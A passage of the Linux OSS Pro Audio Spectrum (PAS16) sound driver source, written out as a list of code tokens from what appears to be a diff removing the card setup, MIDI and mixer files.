"ok", "=", "0", ";", "}", "}", "}", "if", "(", "hw_config", "-", ">", "dma", "<", "0", "|", "|", "hw_config", "-", ">", "dma", ">", "7", ")", "{", "printk", "(", "KERN_ERR", "\"", "PAS16", ":", "Invalid", "DMA", "selection", "%", "d", "\"", ",", "hw_config", "-", ">", "dma", ")", ";", "hw_config", "-", ">", "dma", "=", "-", "1", ";", "ok", "=", "0", ";", "}", "else", "{", "pas_write", "(", "dma_bits", "[", "hw_config", "-", ">", "dma", "]", ",", "0xF389", ")", ";", "if", "(", "!", "dma_bits", "[", "hw_config", "-", ">", "dma", "]", ")", "{", "printk", "(", "KERN_ERR", "\"", "PAS16", ":", "Invalid", "DMA", "selection", "%", "d", "\"", ",", "hw_config", "-", ">", "dma", ")", ";", "hw_config", "-", ">", "dma", "=", "-", "1", ";", "ok", "=", "0", ";", "}", "else", "{", "if", "(", "sound_alloc_dma", "(", "hw_config", "-", ">", "dma", ",", "\"", "PAS16", "\"", "))", "{", "printk", "(", "KERN_ERR", "\"", "pas2_card", ".", "c", ":", "Can", "'", "t", "allocate", "DMA", "channel", "\\", "n", "\"", ");", "hw_config", "-", ">", "dma", "=", "-", "1", ";", "ok", "=", "0", ";", "}", "}", "}", "/", "*", "*", "This", "fixes", "the", "timing", "problems", "of", "the", "PAS", "due", "to", "the", "Symphony", "chipset", "*", "as", "per", "Media", "Vision", ".", "Only", "define", "this", "if", "your", "PAS", "doesn", "'", "t", "work", "correctly", ".", "*", "/", "if", "(", "symphony", ")", "{", "outb", "(", "(", "0x05", ")", ",", "0xa8", ")", ";", "outb", "(", "(", "0x60", ")", ",", "0xa9", ")", ";", "}", "if", "(", "broken_bus_clock", ")", "pas_write", "(", "0x01", "|", "0x10", "|", "0x20", "|", "0x04", ",", "0x8388", ")", ";", "else", "/", "*", "*", "pas_write", "(", "0x01", ",", "0x8388", ")", ";", "*", "/", "pas_write", "(", "0x01", "|", "0x10", "|", "0x20", ",", "0x8388", ")", ";", "pas_write", "(", "0x18", ",", "0x838A", ")", ";", "/", "*", "?", "??", "*", "/", "pas_write", "(", "0x20", "|", "0x01", ",", "0x0B8A", ")", ";", "/", "*", "Mute", "off", ",", "filter", "=", "17", ".", "897", "kHz", "*", "/", "pas_write", "(", "8", ",", "0xBF8A", ")", ";", "mix_write", "(", "0x80", "|", "5", ",", "0x078B", ")", ";", "mix_write", "(", "5", ",", "0x078B", ")", ";", "{", "struct", "address_info", "*", "sb_config", ";", "sb_config", "=", "&", "cfg2", ";", "if", "(", "sb_config", "-", ">", "io_base", ")", "{", "unsigned", "char", "irq_dma", ";", "/", "*", "*", "Turn", "on", "Sound", "Blaster", "compatibility", "*", "bit", "1", "=", "SB", "emulation", "*", "bit", "0", "=", "MPU401", "emulation", "(", "CDPC", "only", ":", "-(", ")", "*", "/", "pas_write", "(", "0x02", ",", "0xF788", ")", ";", "/", "*", "*", "\"", "Emulation", "address", "\"", "*", "/", "pas_write", "(", "(", "sb_config", "-", ">", "io_base", ">", ">", "4", ")", "&", "0x0f", ",", "0xF789", ")", ";", "pas_sb_base", "=", "sb_config", "-", ">", "io_base", ";", "if", "(", "!", "sb_dma_bits", "[", "sb_config", "-", ">", "dma", "]", ")", "printk", "(", "KERN_ERR", "\"", "PAS16", "Warning", ":", "Invalid", "SB", "DMA", "%", "d", "\\", "n", "\\", "n", "\"", ",", "sb_config", "-", ">", "dma", ")", ";", "if", "(", "!", "sb_irq_bits", "[", "sb_config", "-", ">", "irq", "]", ")", "printk", "(", "KERN_ERR", "\"", "PAS16", "Warning", ":", "Invalid", "SB", "IRQ", "%", "d", "\\", "n", "\\", "n", "\"", ",", "sb_config", "-", ">", "irq", ")", ";", "irq_dma", "=", "sb_dma_bits", "[", "sb_config", "-", ">", "dma", "]", "|", "sb_irq_bits", "[", "sb_config", "-", ">", "irq", "]", ";", "pas_write", "(", "irq_dma", ",", "0xFB8A", ")", ";", "}", "else", "pas_write", "(", "0x00", ",", "0xF788", ")", ";", "}", "if", "(", "!", "ok", ")", "printk", "(", "KERN_WARNING", "\"", "PAS16", ":", "Driver", "not", "enabled", "\\", "n", "\"", ");", "return", "ok", ";", "}", "static", "int", "__init", "detect_pas_hw", "(", "struct", "address_info", "*", "hw_config", ")", "{", "unsigned", "char", "board_id", ",", "foo", ";", "/", "*", "*", "WARNING", ":", "Setting", "an", "option", "like", "W", ":", "1", "or", "so", "that", "disables", "warm", "boot", "reset", "*", "of", "the", "card", "will", "screw", "up", "this", "detect", "code", "something", "fierce", ".", "Adding", "code", "*", "to", "handle", "this", "means", "possibly", "interfering", "with", "other", "cards", "on", "the", "bus", "if", "*", "you", "have", "something", "on", "base", "port", "0x388", ".", "SO", "be", "forewarned", ".", "*", "/", "outb", "(", "(", "0xBC", ")", ",", "0x9A01", ")", ";", "/", "*", "Activate", "first", "board", "*", "/", "outb", "(", "(", "hw_config", "-", ">", "io_base", ">", ">", "2", ")", ",", "0x9A01", ")", ";", "/", "*", "Set", "base", "address", "*", "/", "pas_translate_code", "=", "hw_config", "-", ">", "io_base", "-", "0x388", ";", "pas_write", "(", "1", ",", "0xBF88", ")", ";", "/", "*", "Select", "one", "wait", "states", "*", "/", "board_id", "=", "pas_read", "(", "0x0B8B", ")", ";", "if", "(", "board_id", "=", "=", "0xff", ")", "return", "0", ";", "/", "*", "*", "We", "probably", "have", "a", "PAS", "-", "series", "board", ",", "now", "check", "for", "a", "PAS16", "-", "series", "board", "*", "by", "trying", "to", "change", "the", "board", "revision", "bits", ".", "PAS16", "-", "series", "hardware", "won", "'", "t", "*", "let", "you", "do", "this", "-", "the", "bits", "are", "read", "-", "only", ".", "*", "/", "foo", "=", "board_id", "^", "0xe0", ";", "pas_write", "(", "foo", ",", "0x0B8B", ")", ";", "foo", "=", "pas_read", "(", "0x0B8B", ")", ";", "pas_write", "(", "board_id", ",", "0x0B8B", ")", ";", "if", "(", "board_id", "!", "=", "foo", ")", "return", "0", ";", "pas_model", "=", "pas_read", "(", "0xFF88", ")", ";", "return", "pas_model", ";", "}", "static", "void", "__init", "attach_pas_card", "(", "struct", "address_info", "*", "hw_config", ")", "{", "pas_irq", "=", "hw_config", "-", ">", "irq", ";", "if", "(", "detect_pas_hw", "(", "hw_config", ")", ")", "{", "if", "(", "(", "pas_model", "=", "pas_read", "(", "0xFF88", ")", "))", "{", "char", "temp", "[", "100", "]", ";", "if", "(", "pas_model", "<", "0", "|", "|", "pas_model", ">", "=", "ARRAY_SIZE", "(", "pas_model_names", ")", ")", "{", "printk", "(", "KERN_ERR", "\"", "pas2", "unrecognized", "model", ".", "\\", "n", "\"", ");", "return", ";", "}", "sprintf", "(", "temp", ",", "\"", "%", "s", "rev", "%", "d", "\"", ",", "pas_model_names", "[", "(", "int", ")", "pas_model", "]", ",", "pas_read", "(", "0x2789", ")", ");", "conf_printf", "(", "temp", ",", "hw_config", ")", ";", "}", "if", "(", "config_pas_hw", "(", "hw_config", ")", ")", "{", "pas_pcm_init", "(", "hw_config", ")", ";", "pas_midi_init", "(", ");", "pas_init_mixer", "(", ");", "}", "}", "}", "static", "inline", "int", "__init", "probe_pas", "(", "struct", "address_info", "*", "hw_config", ")", "{", "return", "detect_pas_hw", "(", "hw_config", ")", ";", "}", "static", "void", "__exit", "unload_pas", "(", "struct", "address_info", "*", "hw_config", ")", "{", "extern", "int", "pas_audiodev", ";", "extern", "int", "pas2_mididev", ";", "if", "(", "hw_config", "-", ">", "dma", ">", "0", ")", "sound_free_dma", "(", "hw_config", "-", ">", "dma", ")", ";", "if", "(", "hw_config", "-", ">", "irq", ">", "0", ")", "free_irq", "(", "hw_config", "-", ">", "irq", ",", "hw_config", ")", ";", "if", "(", "pas_audiodev", "!", "=-", "1", ")", "sound_unload_mixerdev", "(", "audio_devs", "[", "pas_audiodev", "]", "->", "mixer_dev", ")", ";", "if", "(", "pas2_mididev", "!", "=-", "1", ")", "sound_unload_mididev", "(", "pas2_mididev", ")", ";", "if", "(", "pas_audiodev", "!", "=-", "1", ")", "sound_unload_audiodev", "(", "pas_audiodev", ")", ";", "}", "static", "int", "__initdata", "io", "=", "-", "1", ";", "static", "int", "__initdata", "irq", "=", "-", "1", ";", "static", "int", "__initdata", "dma", "=", "-", "1", ";", "static", "int", "__initdata", "dma16", "=", "-", "1", ";", "/", "*", "Set", "this", "for", "modules", "that", "need", "it", "*", "/", "static", "int", "__initdata", "sb_io", "=", "0", ";", "static", "int", "__initdata", "sb_irq", "=", "-", "1", ";", "static", "int", "__initdata", "sb_dma", "=", "-", "1", ";", "static", "int", "__initdata", "sb_dma16", "=", "-", "1", ";", "module_param_hw", "(", "io", ",", "int", ",", "ioport", ",", "0", ")", ";", "module_param_hw", "(", "irq", ",", "int", ",", "irq", ",", "0", ")", ";", "module_param_hw", "(", "dma", ",", "int", ",", "dma", ",", "0", ")", ";", "module_param_hw", "(", "dma16", ",", "int", ",", "dma", ",", "0", ")", ";", "module_param_hw", "(", "sb_io", ",", "int", ",", "ioport", ",", "0", ")", ";", "module_param_hw", "(", "sb_irq", ",", "int", ",", "irq", ",", "0", ")", ";", "module_param_hw", "(", "sb_dma", ",", "int", ",", "dma", ",", "0", ")", ";", "module_param_hw", "(", "sb_dma16", ",", "int", ",", "dma", ",", "0", ")", ";", "module_param", "(", "joystick", ",", "bool", ",", "0", ")", ";", "module_param", "(", "symphony", ",", "bool", ",", "0", ")", ";", "module_param", "(", "broken_bus_clock", ",", "bool", ",", "0", ")", ";", "MODULE_LICENSE", "(", "\"", "GPL", "\"", ");", "static", "int", "__init", "init_pas2", "(", "void", ")", "{", "printk", "(", "KERN_INFO", "\"", "Pro", "Audio", "Spectrum", "driver", "Copyright", "(", "C", ")", "by", "Hannu", "Savolainen", "1993", "-", "1996", "\\", "n", "\"", ");", "cfg", ".", "io_base", "=", "io", ";", "cfg", ".", "irq", "=", "irq", ";", "cfg", ".", "dma", "=", "dma", ";", "cfg", ".", "dma2", "=", "dma16", ";", "cfg2", ".", "io_base", "=", "sb_io", ";", "cfg2", ".", "irq", "=", "sb_irq", ";", "cfg2", ".", "dma", "=", "sb_dma", ";", "cfg2", ".", "dma2", "=", "sb_dma16", ";", "if", "(", "cfg", ".", "io_base", "=", "=", "-", "1", "|", "|", "cfg", ".", "dma", "=", "=", "-", "1", "|", "|", "cfg", ".", "irq", "=", "=", "-", "1", ")", "{", "printk", "(", "KERN_INFO", "\"", "I", "/", "O", ",", "IRQ", ",", "DMA", "and", "type", "are", "mandatory", "\\", "n", "\"", ");", "return", "-", "EINVAL", ";", "}", "if", "(", "!", "probe_pas", "(", "&", "cfg", ")", ")", "return", "-", "ENODEV", ";", "attach_pas_card", "(", "&", "cfg", ")", ";", "return", "0", ";", "}", "static", "void", "__exit", "cleanup_pas2", "(", "void", ")", "{", "unload_pas", "(", "&", "cfg", ")", ";", "}", "module_init", "(", "init_pas2", ")", ";", "module_exit", "(", "cleanup_pas2", ")", ";", "#", "ifndef", "MODULE", "static", "int", "__init", "setup_pas2", "(", "char", "*", "str", ")", "{", "/", "*", "io", ",", "irq", ",", "dma", ",", "dma2", ",", "sb_io", ",", "sb_irq", ",", "sb_dma", ",", "sb_dma2", "*", "/", "int", "ints", "[", "9", "]", ";", "str", "=", "get_options", "(", "str", ",", "ARRAY_SIZE", "(", "ints", ")", ",", "ints", ")", ";", "io", "=", "ints", "[", "1", "]", ";", "irq", "=", "ints", "[", "2", "]", ";", "dma", "=", "ints", "[", "3", "]", ";", "dma16", "=", "ints", "[", "4", "]", ";", "sb_io", "=", "ints", "[", "5", "]", ";", "sb_irq", "=", "ints", "[", "6", "]", ";", "sb_dma", "=", "ints", "[", "7", "]", ";", "sb_dma16", "=", "ints", "[", "8", "]", ";", "return", "1", ";", "}", "__setup", "(", "\"", "pas2", "=", "\",", "setup_pas2", ")", ";", "#", "endif", "@", "@", "-", "1", ",", "262", "+", "0", ",", "0", "@", "@", "/", "*", "*", "sound", "/", "oss", "/", "pas2_midi", ".", "c", "*", "*", "The", "low", "level", "driver", "for", "the", "PAS", "Midi", "Interface", ".", "*", "/", "/", "*", "*", "Copyright", "(", "C", ")", "by", "Hannu", "Savolainen", "1993", "-", "1997", "*", "*", "OSS", "/", "Free", "for", "Linux", "is", "distributed", "under", "the", "GNU", "GENERAL", "PUBLIC", "LICENSE", "(", "GPL", ")", "*", "Version", "2", "(", "June", "1991", ")", ".", "See", "the", "\"", "COPYING", "\"", "file", "distributed", "with", "this", "software", "*", "for", "more", "info", ".", "*", "*", "Bartlomiej", "Zolnierkiewicz", ":", "Added", "__init", "to", "pas_init_mixer", "(", ")", "*", "/", "#", "include", "<", "linux", "/", "init", ".", "h", ">", "#", "include", "<", "linux", "/", "spinlock", ".", "h", ">", "#", "include", "\"", "sound_config", ".", "h", "\"", "#", "include", "\"", "pas2", ".", "h", "\"", "extern", "spinlock_t", "pas_lock", ";", "static", "int", "midi_busy", ",", "input_opened", ";", "static", "int", "my_dev", ";", "int", "pas2_mididev", "=", "-", "1", ";", "static", "unsigned", "char", "tmp_queue", "[", "256", "]", ";", "static", "volatile", "int", "qlen", ";", "static", "volatile", "unsigned", "char", "qhead", ",", "qtail", ";", "static", "void", "(", "*", "midi_input_intr", ")", "(", "int", "dev", ",", "unsigned", "char", "data", ")", ";", "static", "int", "pas_midi_open", "(", "int", "dev", ",", "int", "mode", ",", "void", "(", "*", "input", ")", "(", "int", "dev", ",", "unsigned", "char", "data", ")", ",", "void", "(", "*", "output", ")", "(", "int", "dev", ")", ")", "{", "int", "err", ";", "unsigned", "long", "flags", ";", "unsigned", "char", "ctrl", ";", "if", "(", "midi_busy", ")", "return", "-", "EBUSY", ";", "/", "*", "*", "Reset", "input", "and", "output", "FIFO", "pointers", "*", "/", "pas_write", "(", "0x20", "|", "0x40", ",", "0x178b", ")", ";", "spin_lock_irqsave", "(", "&", "pas_lock", ",", "flags", ")", ";", "if", "(", "(", "err", "=", "pas_set_intr", "(", "0x10", ")", ")", "<", "0", ")", "{", "spin_unlock_irqrestore", "(", "&", "pas_lock", ",", "flags", ")", ";", "return", "err", ";", "}", "/", "*", "*", "Enable", "input", "available", "and", "output", "FIFO", "empty", "interrupts", "*", "/", "ctrl", "=", "0", ";", "input_opened", "=", "0", ";", "midi_input_intr", "=", "input", ";", "if", "(", "mode", "=", "=", "OPEN_READ", "|", "|", "mode", "=", "=", "OPEN_READWRITE", ")", "{", "ctrl", "|", "=", "0x04", ";", "/", "*", "Enable", "input", "*", "/", "input_opened", "=", "1", ";", "}", "if", "(", "mode", "=", "=", "OPEN_WRITE", "|", "|", "mode", "=", "=", "OPEN_READWRITE", ")", "{", "ctrl", "|", "=", "0x08", "|", "0x10", ";", "/", "*", "Enable", "output", "*", "/", "}", "pas_write", "(", "ctrl", ",", "0x178b", ")", ";", "/", "*", "*", "Acknowledge", "any", "pending", "interrupts", "*", "/", "pas_write", "(", "0xff", ",", "0x1B88", ")", ";", "spin_unlock_irqrestore", "(", "&", "pas_lock", ",", "flags", ")", ";", "midi_busy", "=", "1", ";", "qlen", "=", "qhead", "=", "qtail", "=", "0", ";", "return", "0", ";", "}", "static", "void", "pas_midi_close", "(", "int", "dev", ")", "{", "/", "*", "*", "Reset", "FIFO", "pointers", ",", "disable", "intrs", "*", "/", "pas_write", "(", "0x20", "|", "0x40", ",", "0x178b", ")", ";", "pas_remove_intr", "(", "0x10", ")", ";", "midi_busy", "=", "0", ";", "}", "static", "int", "dump_to_midi", "(", "unsigned", "char", "midi_byte", ")", "{", "int", "fifo_space", ",", "x", ";", "fifo_space", "=", "(", "(", "x", "=", "pas_read", "(", "0x1B89", ")", ")", ">", ">", "4", ")", "&", "0x0f", ";", "/", "*", "*", "The", "MIDI", "FIFO", "space", "register", "and", "it", "'", "s", "documentation", "is", "nonunderstandable", ".", "*", "There", "seem", "to", "be", "no", "way", "to", "differentiate", "between", "buffer", "full", "and", "buffer", "*", "empty", "situations", ".", "For", "this", "reason", "we", "don", "'", "t", "never", "write", "the", "buffer", "*", "completely", "full", ".", "In", "this", "way", "we", "can", "assume", "that", "0", "(", "or", "is", "it", "15", ")", "*", "means", "that", "the", "buffer", "is", "empty", ".", "*", "/", "if", "(", "fifo_space", "<", "2", "&", "&", "fifo_space", "!", "=", "0", ")", "/", "*", "Full", "(", "almost", ")", "*", "/", "return", "0", ";", "/", "*", "Ask", "upper", "layers", "to", "retry", "after", "some", "time", "*", "/", "pas_write", "(", "midi_byte", ",", "0x178A", ")", ";", "return", "1", ";", "}", "static", "int", "pas_midi_out", "(", "int", "dev", ",", "unsigned", "char", "midi_byte", ")", "{", "unsigned", "long", "flags", ";", "/", "*", "*", "Drain", "the", "local", "queue", "first", "*", "/", "spin_lock_irqsave", "(", "&", "pas_lock", ",", "flags", ")", ";", "while", "(", "qlen", "&", "&", "dump_to_midi", "(", "tmp_queue", "[", "qhead", "]", "))", "{", "qlen", "-", "-;", "qhead", "+", "+;", "}", "spin_unlock_irqrestore", "(", "&", "pas_lock", ",", "flags", ")", ";", "/", "*", "*", "Output", "the", "byte", "if", "the", "local", "queue", "is", "empty", ".", "*", "/", "if", "(", "!", "qlen", ")", "if", "(", "dump_to_midi", "(", "midi_byte", ")", ")", "return", "1", ";", "/", "*", "*", "Put", "to", "the", "local", "queue", "*", "/", "if", "(", "qlen", ">", "=", "256", ")", "return", "0", ";", "/", "*", "Local", "queue", "full", "*", "/", "spin_lock_irqsave", "(", "&", "pas_lock", ",", "flags", ")", ";", "tmp_queue", "[", "qtail", "]", "=", "midi_byte", ";", "qlen", "+", "+;", "qtail", "+", "+;", "spin_unlock_irqrestore", "(", "&", "pas_lock", ",", "flags", ")", ";", "return", "1", ";", "}", "static", "int", "pas_midi_start_read", "(", "int", "dev", ")", "{", "return", "0", ";", "}", "static", "int", "pas_midi_end_read", "(", "int", "dev", ")", "{", "return", "0", ";", "}", "static", "void", "pas_midi_kick", "(", "int", "dev", ")", "{", "}", "static", "int", "pas_buffer_status", "(", "int", "dev", ")", "{", "return", "qlen", ";", "}", "#", "define", "MIDI_SYNTH_NAME", "\"", "Pro", "Audio", "Spectrum", "Midi", "\"", "#", "define", "MIDI_SYNTH_CAPS", "SYNTH_CAP_INPUT", "#", "include", "\"", "midi_synth", ".", "h", "\"", "static", "struct", "midi_operations", "pas_midi_operations", "=", "{", ".", "owner", "=", "THIS_MODULE", ",", ".", "info", "=", "{", "\"", "Pro", "Audio", "Spectrum", "\"", ",", "0", ",", "0", ",", "SNDCARD_PAS", "}", ",", ".", "converter", "=", "&", "std_midi_synth", ",", ".", "in_info", "=", "{", "0", "}", ",", ".", "open", "=", "pas_midi_open", ",", ".", "close", "=", "pas_midi_close", ",", ".", "outputc", "=", "pas_midi_out", ",", ".", "start_read", "=", "pas_midi_start_read", ",", ".", "end_read", "=", "pas_midi_end_read", ",", ".", "kick", "=", "pas_midi_kick", ",", ".", "buffer_status", "=", "pas_buffer_status", ",", "}", ";", "void", "__init", "pas_midi_init", "(", "void", ")", "{", "int", "dev", "=", "sound_alloc_mididev", "(", ");", "if", "(", "dev", "=", "=", "-", "1", ")", "{", "printk", "(", "KERN_WARNING", "\"", "pas_midi_init", ":", "Too", "many", "midi", "devices", "detected", "\\", "n", "\"", ");", "return", ";", "}", "std_midi_synth", ".", "midi_dev", "=", "my_dev", "=", "dev", ";", "midi_devs", "[", "dev", "]", "=", "&", "pas_midi_operations", ";", "pas2_mididev", "=", "dev", ";", "sequencer_init", "(", ");", "}", "void", "pas_midi_interrupt", "(", "void", ")", "{", "unsigned", "char", "stat", ";", "int", "i", ",", "incount", ";", "stat", "=", "pas_read", "(", "0x1B88", ")", ";", "if", "(", "stat", "&", "0x04", ")", "/", "*", "Input", "data", "available", "*", "/", "{", "incount", "=", "pas_read", "(", "0x1B89", ")", "&", "0x0f", ";", "/", "*", "Input", "FIFO", "size", "*", "/", "if", "(", "!", "incount", ")", "incount", "=", "16", ";", "for", "(", "i", "=", "0", ";", "i", "<", "incount", ";", "i", "+", "+)", "if", "(", "input_opened", ")", "{", "midi_input_intr", "(", "my_dev", ",", "pas_read", "(", "0x178A", ")", ");", "}", "else", "pas_read", "(", "0x178A", ")", ";", "/", "*", "Flush", "*", "/", "}", "if", "(", "stat", "&", "(", "0x08", "|", "0x10", ")", ")", "{", "spin_lock", "(", "&", "pas_lock", ")", ";/", "*", "called", "in", "irq", "context", "*", "/", "while", "(", "qlen", "&", "&", "dump_to_midi", "(", "tmp_queue", "[", "qhead", "]", "))", "{", "qlen", "-", "-;", "qhead", "+", "+;", "}", "spin_unlock", "(", "&", "pas_lock", ")", ";", "}", "if", "(", "stat", "&", "0x40", ")", "{", "printk", "(", "KERN_WARNING", "\"", "MIDI", "output", "overrun", "%", "x", ",", "%", "x", "\\", "n", "\"", ",", "pas_read", "(", "0x1B89", ")", ",", "stat", ")", ";", "}", "pas_write", "(", "stat", ",", "0x1B88", ")", ";", "/", "*", "Acknowledge", "interrupts", "*", "/", "}", "@", "@", "-", "1", ",", "327", "+", "0", ",", "0", "@", "@", "/", "*", "*", "sound", "/", "oss", "/", "pas2_mixer", ".", "c", "*", "*", "Mixer", "routines", "for", "the", "Pro", "Audio", "Spectrum", "cards", ".", "*", "/", "/", "*", "*", "Copyright", "(", "C", ")", "by", "Hannu", "Savolainen", "1993", "-", "1997", "*", "*", "OSS", "/", "Free", "for", "Linux", "is", "distributed", "under", "the", "GNU", "GENERAL", "PUBLIC", "LICENSE", "(", "GPL", ")", "*", "Version", "2", "(", "June", "1991", ")", ".", "See", "the", "\"", "COPYING", "\"", "file", "distributed", "with", "this", "software", "*", "for", "more", "info", ".", "*", "/", "/", "*", "*", "Thomas", "Sailer", ":", "ioctl", "code", "reworked", "(", "vmalloc", "/", "vfree", "removed", ")", "*", "Bartlomiej", "Zolnierkiewicz", ":", "added", "__init", "to", "pas_init_mixer", "(", ")", "*", "/", "#", "include", "<", "linux", "/", "init", ".", "h", ">", "#", "include", "\"", "sound_config", ".", "h", "\"", "#", "include", "\"", "pas2", ".", "h", "\"", "extern", "int", "pas_translate_code", ";", "extern", "char", "pas_model", ";", "extern", "int", "*", "pas_osp", ";", "extern", "int", "pas_audiodev", ";", "static", "int", "rec_devices", "=", "(", "SOUND_MASK_MIC", ")", ";", "/", "*", "Default", "recording", "source", "*", "/", "static", "int", "mode_control", ";", "#", "define", "POSSIBLE_RECORDING_DEVICES", "(", "SOUND_MASK_SYNTH", "|", "SOUND_MASK_SPEAKER", "|", "SOUND_MASK_LINE", "|", "SOUND_MASK_MIC", "|", "\\", "SOUND_MASK_CD", "|", "SOUND_MASK_ALTPCM", ")", "#", "define", "SUPPORTED_MIXER_DEVICES", "(", "SOUND_MASK_SYNTH", "|", "SOUND_MASK_PCM", "|", "SOUND_MASK_SPEAKER", "|", "SOUND_MASK_LINE", "|", "SOUND_MASK_MIC", "|", "\\", "SOUND_MASK_CD", "|", "SOUND_MASK_ALTPCM", "|", "SOUND_MASK_IMIX", "|", "\\", "SOUND_MASK_VOLUME", "|", "SOUND_MASK_BASS", "|", "SOUND_MASK_TREBLE", "|", "SOUND_MASK_RECLEV", ")", "static", "int", "*", "levels", ";", "static", "int", "default_levels", "[", "32", "]", "=", "{", "0x3232", ",", "/", "*", "Master", "Volume", "*", "/", "0x3232", ",", "/", "*", "Bass", "*", "/", "0x3232", ",", "/", "*", "Treble", "*", "/", "0x5050", ",", "/", "*", "FM", "*", "/", "0x4b4b", ",", "/", "*", "PCM", "*", "/", "0x3232", ",", "/", "*", "PC", "Speaker", "*", "/", "0x4b4b", ",", "/", "*", "Ext", "Line", "*", "/", "0x4b4b", ",", "/", "*", "Mic", "*", "/", "0x4b4b", ",", "/", "*", "CD", "*", "/", "0x6464", ",", "/", "*", "Recording", "monitor", "*", "/", "0x4b4b", ",", "/", "*", "SB", "PCM", "*", "/", "0x6464", "/", "*", "Recording", "level", "*", "/", "}", ";", "void", "mix_write", "(", "unsigned", "char", "data", ",", "int", "ioaddr", ")", "{", "/", "*", "*", "The", "Revision", "D", "cards", "have", "a", "problem", "with", "their", "MVA508", "interface", ".", "The", "*", "kludge", "-", "o", "-", "rama", "fix", "is", "to", "make", "a", "16", "-", "bit", "quantity", "with", "identical", "LSB", "and", "*", "MSBs", "out", "of", "the", "output", "byte", "and", "to", "do", "a", "16", "-", "bit", "out", "to", "the", "mixer", "port", "*", "1", ".", "We", "need", "to", "do", "this", "because", "it", "isn", "'", "t", "timing", "problem", "but", "chip", "access", "*", "sequence", "problem", ".", "*", "/", "if", "(", "pas_model", "=", "=", "4", ")", "{", "outw", "(", "data", "|", "(", "data", "<", "<", "8", ")", ",", "(", "ioaddr", "+", "pas_translate_code", ")", "-", "1", ")", ";", "outb", "(", "(", "0x80", ")", ",", "0", ")", ";", "}", "else", "pas_write", "(", "data", ",", "ioaddr", ")", ";", "}", "static", "int", "mixer_output", "(", "int", "right_vol", ",", "int", "left_vol", ",", "int", "div", ",", "int", "bits", ",", "int", "mixer", ")", "/", "*", "Input", "or", "output", "mixer", "*", "/", "{", "int", "left", "=", "left_vol", "*", "div", "/", "100", ";", "int", "right", "=", "right_vol", "*", "div", "/", "100", ";", "if", "(", "bits", "&", "0x10", ")", "{", "left", "|", "=", "mixer", ";", "right", "|", "=", "mixer", ";", "}", "if", "(", "bits", "=", "=", "0x03", "|", "|", "bits", "=", "=", "0x04", ")", "{", "mix_write", "(", "0x80", "|", "bits", ",", "0x078B", ")", ";", "mix_write", "(", "left", ",", "0x078B", ")", ";", "right_vol", "=", "left_vol", ";", "}", "else", "{", "mix_write", "(", "0x80", "|", "0x20", "|", "bits", ",", "0x078B", ")", ";", "mix_write", "(", "left", ",", "0x078B", ")", ";", "mix_write", "(", "0x80", "|", "0x40", "|", "bits", ",", "0x078B", ")", ";", "mix_write", "(", "right", ",", "0x078B", ")", ";", "}", "return", "(", "left_vol", "|", "(", "right_vol", "<", "<", "8", ")", ");", "}", "static", "void", "set_mode", "(", "int", "new_mode", ")", "{", "mix_write", "(", "0x80", "|", "0x05", ",", "0x078B", ")", ";", "mix_write", "(", "new_mode", ",", "0x078B", ")", ";", "mode_control", "=", "new_mode", ";", "}", "static", "int", "pas_mixer_set", "(", "int", "whichDev", ",", "unsigned", "int", "level", ")", "{", "int", "left", ",", "right", ",", "devmask", ",", "changed", ",", "i", ",", "mixer", "=", "0", ";", "left", "=", "level", "&", "0x7f", ";", "right", "=", "(", "level", "&", "0x7f00", ")", ">", ">", "8", ";", "if", "(", "whichDev", "<", "SOUND_MIXER_NRDEVICES", ")", "{", "if", "(", "(", "1", "<", "<", "whichDev", ")", "&", "rec_devices", ")", "mixer", "=", "0x20", ";", "else", "mixer", "=", "0x00", ";", "}", "switch", "(", "whichDev", ")", "{", "case", "SOUND_MIXER_VOLUME", ":", "/", "*", "Master", "volume", "(", "0", "-", "63", ")", "*", "/", "levels", "[", "whichDev", "]", "=", "mixer_output", "(", "right", ",", "left", ",", "63", ",", "0x01", ",", "0", ")", ";", "break", ";", "/", "*", "*", "Note", "!", "Bass", "and", "Treble", "are", "mono", "devices", ".", "Will", "use", "just", "the", "left", "*", "channel", ".", "*", "/", "case", "SOUND_MIXER_BASS", ":", "/", "*", "Bass", "(", "0", "-", "12", ")", "*", "/", "levels", "[", "whichDev", "]", "=", "mixer_output", "(", "right", ",", "left", ",", "12", ",", "0x03", ",", "0", ")", ";", "break", ";", "case", "SOUND_MIXER_TREBLE", ":", "/", "*", "Treble", "(", "0", "-", "12", ")", "*", "/", "levels", "[", "whichDev", "]", "=", "mixer_output", "(", "right", ",", "left", ",", "12", ",", "0x04", ",", "0", ")", ";", "break", ";", "case", "SOUND_MIXER_SYNTH", ":", "/", "*", "Internal", "synthesizer", "(", "0", "-", "31", ")", "*", "/", "levels", "[", "whichDev", "]", "=", "mixer_output", "(", "right", ",", "left", ",", "31", ",", "0x10", "|", "0x00", ",", "mixer", ")", ";", "break", ";", "case", "SOUND_MIXER_PCM", ":", "/", "*", "PAS", "PCM", "(", "0", "-", "31", ")", "*", "/", "levels", "[", "whichDev", "]", "=", "mixer_output", "(", "right", ",", "left", ",", "31", ",", "0x10", "|", "0x05", ",", "mixer", ")", ";", "break", ";", "case", "SOUND_MIXER_ALTPCM", ":", "/", "*", "SB", "PCM", "(", "0", "-", "31", ")", "*", "/", "levels", "[", "whichDev", "]", "=", "mixer_output", "(", "right", ",", "left", ",", "31", ",", "0x10", "|", "0x07", ",", "mixer", ")", ";", "break", ";", "case", "SOUND_MIXER_SPEAKER", ":", "/", "*", "PC", "speaker", "(", "0", "-", "31", ")", "*", "/", "levels", "[", "whichDev", "]", "=", "mixer_output", "(", "right", ",", "left", ",", "31", ",", "0x10", "|", "0x06", ",", "mixer", ")", ";", "break", ";", "case", "SOUND_MIXER_LINE", ":", "/", "*", "External", "line", "(", "0", "-", "31", ")", "*", "/", "levels", "[", "whichDev", "]", "=", "mixer_output", "(", "right", ",", "left", ",", "31", ",", "0x10", "|", "0x02", ",", "mixer", ")", ";", "break", ";", "case", "SOUND_MIXER_CD", ":", "/", "*", "CD", "(", "0", "-", "31", ")", "*", "/", "levels", "[", "whichDev", "]", "=", "mixer_output", "(", "right", ",", "left", ",", "31", ",", "0x10", "|", "0x03", ",", "mixer", ")", ";", "break", ";", "case", "SOUND_MIXER_MIC", ":", "/", "*", "External", "microphone", "(", "0", "-", "31", ")", "*", "/", "levels", "[", "whichDev", "]", "=", "mixer_output", "(", "right", ",", "left", ",", "31", ",", "0x10", "|", "0x04", ",", "mixer", ")", ";", "break", ";", "case", "SOUND_MIXER_IMIX", ":", "/", "*", "Recording", "monitor", "(", "0", "-", "31", ")", "(", "Output", "mixer", "only", ")", "*", "/", "levels", "[", "whichDev", "]", "=", "mixer_output", 